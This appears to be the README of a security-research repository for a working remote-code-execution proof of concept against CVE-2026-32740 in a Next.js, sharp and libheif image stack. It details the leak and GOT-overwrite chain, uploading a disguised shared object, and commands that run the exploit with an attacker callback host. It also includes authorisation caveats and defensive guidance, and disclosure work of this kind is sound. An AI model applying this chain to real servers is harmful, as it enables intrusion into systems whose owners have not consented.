# libheif grid-to-GOT Next.js RCE

Working remote proof of concept that turns CVE-2026-32740 in the
version-pinned Next.js/sharp image stack into a chosen-address write and a
native-code callback.

This is a private Fortbridge research repository. Use it only against the
included lab or another system you are explicitly authorised to test.

## What the PoC proves

The exploit uses only the target's HTTP upload and image-optimization routes:

1. It uploads a callback shared object under the image-looking name `x.jpg`.
2. It repeatedly submits a donor AVIF until pixels returned by the optimizer
   disclose one unambiguous three-pointer libvips signature.
3. It derives the randomized libvips base from those returned pixels.
4. It generates a 116x33 four-tile AVIF whose Cb overflow redirects the Cr
   plane to `memcpy@GOT - 16`.
5. The first chosen-address row replaces `memcpy@GOT` with Node's fixed
   `unixDlOpen`; the next row supplies `uploads/x.jpg` in RSI.
6. Loading the staged shared object runs the fixed command `/usr/bin/id` and
   returns its output over TCP. An internal per-attempt identifier prevents a
   stale or unrelated callback from being counted as success; it is not the
   command-execution proof.

The final validation cohort succeeded in 10/10 fresh processes with ten
different ASLR bases. See
[`evidence/profile-manifest-rce-10x.json`](evidence/profile-manifest-rce-10x.json).

## Tested stack

- Node.js 25.8.1, non-PIE `ET_EXEC`
- Next.js 15.5.23
- sharp 0.34.4
- bundled libvips 8.17.2
- bundled libheif 1.20.2
- Linux x86-64 with ASLR and NX enabled

The Node helper address, libvips relocation offset and partial-pointer layout
are build-specific. They now live in a strict, versioned native-stack profile
rather than in the exploit source. This repository fails closed when a profile
is malformed or when the remote pixel leak does not produce exactly one
complete three-pointer signature.

## Requirements

- Linux x86-64
- Python 3.11 or later
- `ffmpeg` with the `libaom-av1` encoder
- a C compiler available as `cc`
- an IPv4 callback address reachable from the target
- Node.js 25.8.1 and npm to run the included lab

Install the only Python dependency:

```bash
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -r requirements.txt
```

Confirm AV1 encoding support:

```bash
ffmpeg -hide_banner -encoders | grep libaom-av1
```

## Start the included lab

The lab intentionally accepts arbitrary uploads and passes selected files to
sharp. Do not expose it to an untrusted network.

```bash
cd lab
npm ci
npm run build
npm run start
```

The target is then available at `http://127.0.0.1:3000`.

Do not add `LD_PRELOAD`, `MALLOC_ARENA_MAX`, `GLIBC_TUNABLES`,
`VIPS_CONCURRENCY` or `UV_THREADPOOL_SIZE`. The published result uses the
stock process environment and normal sharp worker scheduling.

## Run the exploit

For a local lab, use loopback for both the target and callback:

```bash
python3 exploit.py \
  --target http://127.0.0.1:3000 \
  --callback-host 127.0.0.1 \
  --json-output result.json
```

The exploit automatically selects the manifest's default profile. To select a
specific supported stack, provide its ID explicitly:

```bash
python3 exploit.py \
  --target http://127.0.0.1:3000 \
  --callback-host 127.0.0.1 \
  --profile node-25.8.1-sharp-0.34.4-linux-x64
```

For an authorised remote target, `--callback-host` must be an attacker IPv4
address that the target can reach. The listener binds to all local interfaces
by default:

```bash
python3 exploit.py \
  --target https://authorised-target.example \
  --callback-host 203.0.113.10 \
  --callback-port 33333 \
  --json-output result.json
```

A successful result contains:

```json
{
  "success": true,
  "callback": {
    "token_matched": true,
    "proof_command": "/usr/bin/id",
    "command_output": "uid=1000(research) gid=1000(research) groups=1000(research)"
  }
}
```

The terminal also prints the result directly:

```text
[RCE] /usr/bin/id -> uid=1000(research) gid=1000(research) groups=1000(research)
```

The optimizer request will usually end with a connection drop and the target
process will normally terminate after the callback. Those events are recorded
for context but are not success conditions.

## Command-line options

```text
--target URL              Target base URL (required)
--callback-host IPV4      Address embedded in the uploaded library (required)
--callback-port PORT      Callback and listener port (default: 33333)
--listen-host IPV4        Local bind address (default: 0.0.0.0)
--leak-attempts N         Maximum donor requests (default: 16)
--callback-timeout SEC    Listener timeout (default: 12)
--trigger-timeout SEC     Optimizer request timeout (default: 20)
--profile-manifest FILE   Profile manifest (default: repository manifest)
--profile ID              Profile ID (default: manifest default_profile)
--library-name NAME       Override the profile's staged filename
--remote-upload-dir DIR   Override the profile's upload directory
--json-output FILE        Save the complete result
--concise                 Omit the full JSON result from the terminal
```

The complete target-relative library path, including its terminating NUL,
must fit the selected profile's path field. The default `uploads/x.jpg`
satisfies the pinned profile's 16-byte constraint.

## Native-stack profiles

[`profiles/native_stack_profiles.json`](profiles/native_stack_profiles.json)
binds one exploit layout to exact artifacts and ABI measurements. The pinned
profile identifies Node, Next.js, sharp, libvips, libheif, glibc and
libstdc++, then records the loader helper, GOT relocation, returned-pointer
signatures, forged red-black-tree/ImagePlane layout, heap selector, tile
geometry and application paths.

The runtime loader rejects unknown or missing fields, malformed numbers and
digests, unsafe paths, and inconsistent geometry before opening its callback
listener or making an HTTP request. A profile is a verified compatibility
record, not an automatic OS guess.

Verify a local stack against every declared identity before using its profile:

```bash
python3 tools/verify_profile_artifacts.py \
  --node /home/research/.nvm/versions/node/v25.8.1/bin/node \
  --libvips lab/node_modules/@img/sharp-libvips-linux-x64/lib/libvips-cpp.so.8.17.2 \
  --libc /usr/lib/x86_64-linux-gnu/libc.so.6 \
  --libstdcxx /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.35 \
  --next-package lab/node_modules/next/package.json \
  --sharp-package lab/node_modules/sharp/package.json \
  --libvips-package lab/node_modules/@img/sharp-libvips-linux-x64/package.json \
  --versions-json lab/node_modules/@img/sharp-libvips-linux-x64/versions.json
```

This offline verifier checks hashes, ELF build IDs and type, Node version and
loader bytes, the libvips `memcpy` jump slot, npm package versions, and bundled
libvips/libheif versions. It is deliberately not imported or run by the remote
exploit.

Run the regression suite and fresh-process cohort with:

```bash
python3 -m unittest discover -s tests -v
python3 scripts/fresh_process_cohort.py --lifetimes 10
```

## Repository layout

```text
exploit.py                         remote orchestrator and callback verifier
rce_payload.py                     proven memcpy-GOT AVIF payload
stack_profile.py                   strict native-stack profile loader
profiles/native_stack_profiles.json exact supported artifact and ABI identity
tools/verify_profile_artifacts.py  offline exact-artifact verifier
scripts/fresh_process_cohort.py    stock fresh-process validation harness
tests/                             strict-loader and exploit regressions
avif_grid.py                       lossless AV1 grid/ISO-BMFF generator
callback/callback.c                fixed /usr/bin/id constructor proof
payloads/leak-crop-donor-*.avif    returned-pixel information disclosure
lab/                               version-pinned Next.js target
evidence/                          debugger-free validation results
```

`rce_payload.py` contains only the final demonstrated chain. Abandoned BSS,
vtable and rb-tree-GOT experiments were intentionally excluded.

## Scope and limitations

- The target needs an upload path that preserves an attacker-chosen file in a
  location reachable by `dlopen`, plus a sharp optimization path for AVIF.
- The included lab accepts an ELF shared object named `x.jpg`. Strong magic
  validation, generated storage names, or an upload directory outside the
  application working directory can break the staging step.
- The fixed Node and libvips offsets apply only to the tested binaries.
- The low-16-bit plane-map redirection depends on the measured pinned sharp
  worker layout.
- The PoC proves native execution by returning `/usr/bin/id` output; it does
  not provide an arbitrary command interface or attempt to keep the corrupted
  target process alive.

## Defensive guidance

- Upgrade to a libheif release containing the CVE-2026-32740 fix and rebuild
  every dependent sharp/libvips component.
- Reject or isolate AVIF/HEIF processing until the deployed native dependency
  chain has been verified.
- Validate upload magic, generate server-side names and store uploads outside
  the application working directory on a `noexec` mount.
- Run image decoding in a disposable, least-privileged worker without secrets
  or unrestricted outbound network access.
- Monitor native image workers for crashes and unexpected `dlopen` or file
  access against upload directories.

## Reproducibility rules

The final evidence was produced without `LD_PRELOAD`, `/proc` address reads,
debugger-derived runtime values, disabled ASLR, allocator tuning, worker-count
changes or target configuration changes. Passive debugging was used during
development only to label fixed binary offsets and was not part of the
delivered exploit.
